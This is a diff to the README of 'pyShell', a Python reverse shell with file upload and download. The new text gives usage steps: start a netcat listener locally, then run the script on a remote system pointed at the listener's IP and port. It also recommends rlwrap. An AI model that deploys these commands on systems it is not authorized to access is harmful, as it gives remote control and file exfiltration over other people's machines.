@@ -1,5 +1,12 @@
 # pyShell
 
 pyShell is a reverse shell with upload/download functionality. Deploy and execute pyShell.py on the remote system and catch with netcat.
-The remote system must have python installed, or pyShell must be compiled with something like pyinstaller.
+
+Usage: on your local system run       nc -lvp <port number>
+       on the remote system run       python3 pyshell.py -t <target ip> -p <port number>
+  
+Requirements: Remote system must have python3 installed, or pyshell.py must be compiled with pyinstaller.
+
+Recommendation: install rlwrap and prefix local receiver command with rlwrap for improved tab completion
+                rlwrap nc -lvp <port number>
 
